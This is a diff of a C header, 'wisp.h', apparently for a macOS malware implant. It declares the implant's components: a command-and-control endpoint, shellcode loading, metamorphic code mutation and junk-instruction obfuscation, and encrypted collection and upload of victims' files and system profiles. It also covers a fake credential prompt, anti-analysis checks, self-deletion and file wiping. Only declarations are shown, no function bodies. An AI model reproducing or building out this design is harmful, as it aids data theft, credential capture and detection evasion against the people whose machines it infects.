@@ -1,8 +1,4 @@
 #pragma once
-/**
- * @file wisp.h
- */
-
 #ifdef __cplusplus
 extern "C" {
 #endif
@@ -69,284 +65,172 @@ extern "C" {
 #include <immintrin.h>
 #endif
 
-// ----------------------------------------
-//  Macros
-// ----------------------------------------
-#define KEY_SIZE        32
-#define STUB_SIZE       30
-#define JUNK_SIZE       16
-#define BLOCK_SIZE      16
-#define MAX_FILES       1024
-#define PWD             256
-#define PAGE_SIZE       4096
+#define _XOPEN_SOURCE 700
+#define KEY_SIZE 32
+#define SYS_Z 2
+#define X86_JUNK_COUNT 10
+#define JUNK_SIZE 16
+#define BLOCK_SIZE 16
+#define PAGE_SIZE 4096
+#define MAX_FILES 1024
+#define PWD 256
 
 #ifdef TEST
-#  define DBG(fmt, ...)    fprintf(stderr, fmt "\n", ##__VA_ARGS__)
+#define DBG(fmt, ...) fprintf(stderr, fmt "\n", ##__VA_ARGS__)
 #else
-#  define DBG(...) ((void)0)
+#define DBG(...) ((void)0)
 #endif
 
-#define ROTL32(x, n)      (((x) << (n)) | ((x) >> (32 - (n))))
+#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
+#define cipher(k,iv,in,out,len) crypt_payload(1,k,iv,in,out,len)
+#define decipher(k,iv,in,out,len) crypt_payload(0,k,iv,in,out,len)
 
-#define cipher(k, iv, in, out, len)     crypt_payload(1, k, iv, in, out, len)
-#define decipher(k, iv, in, out, len)   crypt_payload(0, k, iv, in, out, len)
+#define patch8(b,s,o,v) do{if((o)<(s))(b)[o]=(v);}while(0)
+#define patch16(b,s,o,v) do{if((o)+1<(s))*((uint16_t*)&(b)[o])=(v);}while(0)
+#define patch32(b,s,o,v) do{if((o)+3<(s))*((uint32_t*)&(b)[o])=(v);}while(0)
 
-char *decrypt_path(const uint8_t *key, const uint8_t *iv, const uint8_t *data, size_t len);
+static const uint8_t *did_we_cry;
+static size_t did_we_cry_size;
+static bool notsafe;
 
-// ----------------------------------------
-// Arch
-// ----------------------------------------
-#if defined(ARCH_X86)
+//  Types 
+typedef enum { OP_NONE, OP_REG, OP_MEM, OP_IMM, OP_REL } op_type_t;
+typedef struct { op_type_t type; uint8_t size; union { uint8_t reg; struct { uint8_t base,index,scale; int64_t disp; } mem; uint64_t imm; }; } operand_t;
+typedef struct { uint8_t raw[15],len,prefixes,rex,opcode[4],opcode_len; bool vex,evex,has_modrm,has_sib; uint8_t modrm,sib,disp_size; int64_t disp; uint8_t imm_size; uint64_t imm; bool rex_w,rex_r,rex_x,rex_b,modifies_ip,is_control_flow,valid,ring0; int64_t target; operand_t ops[3]; } x86_inst_t;
+typedef struct { uint32_t raw,opcode,opcode_len; int type; int rd,rn,rm,ra; uint64_t imm; uint8_t imm_size,shift_type,shift_amount; bool is_64bit,is_signed,is_privileged,is_control_flow,modifies_ip,valid,privileged; uint8_t len; int64_t target; } arm64_inst_t;
+typedef struct { uint8_t rd_reegs[8],wr_reegs[8],regs_rd,regs_wr; uint64_t mem_addr; bool mem_rd,mem_wr; uint8_t flag_rd,falg_wr; int8_t stk_adj; bool ring0,voll,can_throw; } real_sem_t;
+typedef struct { uint8_t base_reg,index_reg,scale; int64_t disp; bool has_sib,rip_relative; } addr_mode_t;
+typedef struct { size_t start,end,successors[4],num_successors; bool is_exit; } rec_block_t;
+typedef struct { rec_block_t *blocks; size_t num_blocks,cap_blocks; bool *visited; size_t code_size; } rec_cfg_t;
+typedef uint8_t (*memread_fn)(uintptr_t);
 
-typedef enum {
-    OP_NONE, OP_REG, OP_MEM, OP_IMM
-} op_type_t;
+typedef struct __attribute__((packed)) { uint8_t key[KEY_SIZE],iv[kCCBlockSizeAES128]; uint64_t seed; uint32_t count; uint8_t hash[CC_SHA256_DIGEST_LENGTH]; } enc_header_t;
+typedef struct { uint8_t key[KEY_SIZE],iv[16],stream[64]; size_t position; uint64_t counter; } chacha_state_t;
+typedef struct { char *path; size_t size; } file_t;
+typedef enum { WIPE_ZERO,WIPE_ONE,WIPE_RANDOM,WIPE_CUSTOM } wipe_pattern_t;
+typedef struct { int passes; wipe_pattern_t *patterns; unsigned char custom; } wipe_conf_t;
+typedef struct { char *data; size_t size; } mem_buf_t;
+typedef struct { uint8_t key[KEY_SIZE],iv[16]; size_t len; uint8_t data[64]; } enc_vault_t;
+typedef struct { chacha_state_t rng; } dummy_rng_t; 
 
-typedef struct {
-    op_type_t type;
-    uint8_t size;
-    union {
-        uint8_t reg;
-        struct {
-            uint8_t base, index, scale;
-            int64_t disp;
-        } mem;
-        uint64_t imm;
-    };
-} operand_t;
+typedef enum { MUT_SUB,MUT_EQUIV,MUT_PRED,MUT_DEAD,MUT_SPLIT,MUT_OBFUSC,MUT_FLATTEN,MUT_REORDER,MUT_JUNK } mutx_type_t;
+typedef struct { size_t offset,length; mutx_type_t type; uint32_t gen; char des[64]; } mutx_entry_t;
+typedef struct { mutx_entry_t *entries; size_t count,cap; } muttt_t;
+typedef struct { uint8_t reg; size_t def_offset,last_use; bool iz_live,iz_vol; } reg_liveness_t;
+typedef struct { reg_liveness_t regs[16]; size_t num_regs; } liveness_state_t;
+typedef struct { size_t start,end,id,successors[4],num_successors; bool is_exit; } basic_block_t;
+typedef struct { basic_block_t *blocks; size_t num_blocks,entry_block,exit_block; } cfg_t;
+typedef struct { size_t *dominators, num_doms, *dominated, num_dominated; } dom_info_t;
+typedef struct { size_t header,*body,body_size,*exits,exits_size; } loop_info_t;
+typedef struct { size_t caller,callee,call_site; } call_edge_t;
+typedef struct { call_edge_t *edges; size_t num_edges,*functions,num_functions; } call_graph_t;
+typedef struct { size_t off,len; uint8_t type; bool cf,valid; uint8_t raw[16]; } instr_info_t;
+typedef enum { ST_NOP=0,ST_ALU,ST_BIT,ST_MOV,ST_CMP,ST_FLOW,ST_JCC,ST_STK,ST_FLAG,ST_MEM,ST_SYS } sem_type_t;
+typedef struct { uint8_t type,size,reg; int64_t disp; uint64_t imm; bool izre,izwri; } m_operand_t;
+typedef struct { sem_type_t sem_type; m_operand_t ops[3]; uint8_t num_ops; bool f_out,f_in,m_out,m_in,stk_out,stk_in; uint8_t stk_adj; bool ring0,voll; } sem_meta_t;
 
-typedef struct {
-    uint8_t raw[15];
-    uint8_t len;
-    uint8_t prefixes;
-    uint8_t rex;
-    uint8_t opcode[4];
-    uint8_t opcode_len;
-    bool vex, evex;
-    bool has_modrm, has_sib;
-    uint8_t modrm, sib;
-    uint8_t disp_size;
-    int64_t disp;
-    uint8_t imm_size;
-    uint64_t imm;
-    bool rex_w;
-    bool modifies_ip;
-    int64_t target;
-    bool valid;
-    bool privileged;
-    operand_t ops[3];
-} x86_inst_t;
-
-typedef uint8_t (*memread_fn)(uintptr_t addr);
-bool decode_x86(const uint8_t *code, uintptr_t ip, x86_inst_t *inst, memread_fn mem_read);
-
-#elif defined(ARCH_ARM)
-
-typedef enum {
-    ARM_OP_NONE,
-    ARM_OP_BRANCH,
-    ARM_OP_BRANCH_LINK,
-    ARM_OP_BRANCH_COND,
-    ARM_OP_BRANCH_INDIRECT,
-    ARM_OP_RET,
-    ARM_OP_SVC,
-    ARM_OP_SYS
-} arm_op_t;
-
-typedef struct {
-    uint32_t raw;
-    int64_t target;
-    arm_op_t type;
-    bool valid;
-    bool privileged;
-} arm64_inst_t;
-
-bool decode_arm64(const uint8_t *code, arm64_inst_t *out);
-
-#endif
-
-// ----------------------------------------
-// Structures
-// ----------------------------------------
-typedef struct __attribute__((packed)) {
-    uint8_t  key[KEY_SIZE];
-    uint8_t  iv[kCCBlockSizeAES128];
-    uint64_t seed;
-    uint32_t count;
-    uint8_t  hash[CC_SHA256_DIGEST_LENGTH];
-} enc_header_t;
-
-typedef struct {
-    uint8_t  key[KEY_SIZE];
-    uint8_t  iv[12];
-    uint8_t  stream[64];
-    size_t   position;
-    uint64_t counter;
-} chacha_state_t;
-
-typedef struct {
-    char   *path;
-    size_t  size;
-} file_t;
-
-typedef enum {
-    WIPE_ZERO,
-    WIPE_ONE,
-    WIPE_RANDOM,
-    WIPE_CUSTOM
-} wipe_pattern_t;
-
-typedef struct {
-    int             passes;
-    wipe_pattern_t *patterns;
-    unsigned char   custom;
-} wipe_conf_t;
-
-typedef struct {
-    char   *data;
-    size_t  size;
-} mem_buf_t;
-
-typedef struct {
-    uint8_t key[KEY_SIZE];
-    uint8_t iv[16];
-    size_t  len;
-    uint8_t data[64];
-} enc_vault_t;
-
-extern file_t *files[MAX_FILES];
-extern const enc_vault_t vault[];
-extern const enc_vault_t paths[];
-typedef int (*sysctl_fn)(int *, u_int, void *, size_t *, void *, size_t);
-
-// ----------------------------------------
-// Globals
-// ----------------------------------------
-extern char C2_ENDPOINT[1024];
-extern char PUBKEY_URL[1024];
-extern file_t *files[MAX_FILES];
+//  Externs 
+extern char C2_ENDPOINT[1024],PUBKEY_URL[1024],tmpDirectory[256],*_strings[8];
 extern int fileCount;
-extern char tmpDirectory[256];
-extern char *_strings[8];
 extern struct mach_header_64 _mh_execute_header;
-extern uint8_t data[sizeof(enc_header_t) + PAGE_SIZE];
+extern uint8_t data[sizeof(enc_header_t)+PAGE_SIZE];
 extern const uint8_t dummy[];
 extern const size_t len;
-extern const enc_vault_t vault[];
-extern const size_t vault_count;
-extern const enc_vault_t paths[];
-extern const size_t paths_count;
+extern const size_t vault_count,paths_count;
+#if defined(ARCH_X86)
+extern const uint8_t x86_junk[][16];
+#elif defined(ARCH_ARM)
+extern const uint8_t arm_junk[][8];
+#endif
 
-// ----------------------------------------
-// Wisp
-// ----------------------------------------
+//  Core API 
+void run(void);
+int main(void);
+void initialize(void);
 
-// Pop 
-int  boot(uint8_t *section_data, size_t section_size, chacha_state_t *rng);
-int  cook(uint8_t *section_data, size_t section_size, chacha_state_t *rng);
-void pop_shellcode(uint8_t *code, size_t size);
+//  Crypto 
+void crypt_payload(int,const uint8_t*,const uint8_t*,const uint8_t*,uint8_t*,size_t);
+void chacha20_block(const uint32_t[8],uint32_t,const uint32_t[3],uint32_t[16]);
+void chacha20_init(chacha_state_t*,const uint8_t*,size_t);
+uint32_t chacha20_random(chacha_state_t*);
 
-// Mutation
-void mutate(uint8_t *code, size_t size, chacha_state_t *rng);
-void swap_instructions(uint8_t *code, size_t size, chacha_state_t *rng);
-void insert_junk(uint8_t *code, size_t size, chacha_state_t *rng);
-void opaque_predicate(uint8_t *buf, size_t *len, uint32_t value);
+//  Mutation/Obfuscation 
+void mutate(uint8_t*,size_t,chacha_state_t*,unsigned);
+void mut_sh3ll(uint8_t*,size_t,chacha_state_t*,unsigned);
+size_t snap_instr_len(const uint8_t*,size_t);
+bool it_op(const uint8_t*);
+bool it_chunk(const uint8_t*,size_t);
+void xpass_swp(uint8_t*,size_t,chacha_state_t*);
+void xpass_jnk(uint8_t*,size_t,chacha_state_t*);
+void xpass_opq(uint8_t*,size_t,chacha_state_t*);
+void xpass_rswp(uint8_t*,size_t,chacha_state_t*);
 
-// Crypto 
-void chacha20_block(const uint32_t key[8], uint32_t counter,
-                    const uint32_t nonce[3], uint32_t out[16]);
-uint32_t chacha20_random(chacha_state_t *rng);
-void chacha20_init(chacha_state_t *rng, const uint8_t *seed, size_t len);
+//  Mach-O / Loader 
+int boot(uint8_t*,size_t,chacha_state_t*);
+int cook(uint8_t*,size_t,chacha_state_t*);
+void pop_shellcode(uint8_t*,size_t);
+void O2(void*,const void*,size_t);
+void zer0(void*,size_t);
+int oprw(const char*);
+void clso(int);
+int reset(int);
+int wrby(int,unsigned char*,size_t);
+int copyFile(const char*,const char*);
+unsigned char* compressData(const unsigned char*,size_t,size_t*);
+int fileCollector(const char*,const struct stat*,int,struct FTW*);
+void sendFilesBundle(RSA*);
 
-int trim_newlines(uint8_t *buf, size_t len);
-void crypt_payload(int encrypt,
-                   const uint8_t *key, const uint8_t *iv,
-                   const uint8_t *in,  uint8_t *out,
-                   size_t len);
-
-unsigned char *wrap_loot(const unsigned char *plaintext,
-                         size_t plaintext_len,
-                         size_t *out_len,
-                         RSA *rsa_pubkey);
-
-// Tools
-size_t snap_instr_len(const uint8_t *code);
-bool   it_op(const uint8_t *code);
-bool   it_chunk(const uint8_t *code, size_t max_len);
-
-// Persistence, Wiping
-wipe_conf_t *prep_nuker(int passes);
-void         burn_config(wipe_conf_t *config);
-int          self_wipe(const char *path, const wipe_conf_t *config);
-int          nuke_file(const char *path, const wipe_conf_t *config);
-
-// Networking & C2
-size_t networkWriteCallback(void *contents, size_t size, size_t nmemb, void *userp);
-RSA* grab_rsa(const char *url);
-char* fetch_past(const char *url);
-int from_past(const char *content, char *pubkey_url, char *c2_endpoint);
-void overn_out(const char *server_url, const unsigned char *data, size_t size);
-
-// Profiling & System Info
-void profiler(char *buffer, size_t bufsize, size_t *offset);
-void collectSystemInfo(RSA *rsaPubKey);
-void mint_uuid(char *id);
-
-int sendProfile(void);
-
-// String 
-void initialize__strings();
-void cleanup__strings();
-
-// Environment
+//  Anti/Detection 
 int scan(void);
-int path_exists(const char *p);
-char *trim_w1(char *str);
-
-// Id
-int  find_self(char *out, uint32_t *size);
-void mint_uuid(char *id);
-int  autodes(void);
+int path_exists(const char*);
+int find_self(char*,uint32_t*);
 void k_ill(void);
+int autodes(void);
+void set_crash(void);
 __attribute__((noreturn)) void panic(void);
 
-// Auth
-char *request_input(const char *prompt_script);
-void  request_a(void);
-int   auth(const char *username, const char *password);
-int   is_user_admin(const char *username);
+//  Vault/Strings 
+char *decrypt_path(const uint8_t*,const uint8_t*,const uint8_t*,size_t);
+unsigned char *wrap_loot(const unsigned char*,size_t,size_t*,RSA*);
+void initialize__strings(void);
+void cleanup__strings(void);
 
-// I/O 
-extern void O2(void *dest, const void *src, size_t n);
-extern void zer0(void *ptr, size_t n);
+//  Network/C2 
+size_t networkWriteCallback(void*,size_t,size_t,void*);
+RSA* grab_rsa(const char*);
+char* fetch_past(const char*);
+int from_past(const char*,char*,char*);
+void overn_out(const char*,const unsigned char*,size_t);
+void profiler(char*,size_t,size_t*);
+void collectSystemInfo(RSA*);
+void mint_uuid(char*);
+int sendProfile(void);
 
-int  oprw(const char *path);
-void clso(int fd);
-int  reset(int fd);
-int  wrby(int fd, unsigned char *buf, size_t len);
-
-int copyFile(const char *src, const char *dst);
-unsigned char* compressData(const unsigned char *in, size_t inLen, size_t *outLen);
-int fileCollector(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf);
-void sendFilesBundle(RSA *rsaPubKey);
-
-// Misc
-char *execute(const char *command);
-void  free_if_not(void *ptr);
-char *extract(const char *output, const char *start_marker, const char *end_marker);
-void  hexdump(const uint8_t *data, size_t len, const char *label);
-
-int   _snprintf(char *str, size_t size, const char *fmt, ...);
-char *_strncpy(char *dest, const char *src, size_t n);
-
-// Info
+//  Auth/User 
+int auth(const char*,const char*);
+int is_user_admin(const char*);
 char *get_device_id(void);
 char *get_current_user(void);
-void  update(void);
+void request_a(void);
+char *request_input(const char*);
 
-// URL & HTTP
-/* void build_url(char *buf);
-void http_post(const char *url, const unsigned char *data, size_t size); */
+//  Util 
+int trim_newlines(uint8_t*,size_t);
+char *trim_w1(char*);
+void free_if_not(void*);
+char *extract(const char*,const char*,const char*);
+void hexdump(const uint8_t*,size_t,const char*);
+int _snprintf(char*,size_t,const char*,...);
+char *_strncpy(char*,const char*,size_t);
+void update(void);
+
+//  Decoders 
+#if defined(ARCH_X86)
+bool decode_x86(const uint8_t*, uintptr_t, x86_inst_t*, memread_fn);
+bool decode_x86_withme(const uint8_t*, size_t, uintptr_t, x86_inst_t*, memread_fn);
+#elif defined(ARCH_ARM)
+bool decode_arm64(const uint8_t*, arm64_inst_t*);
+#endif
 
 #ifdef __cplusplus
 }
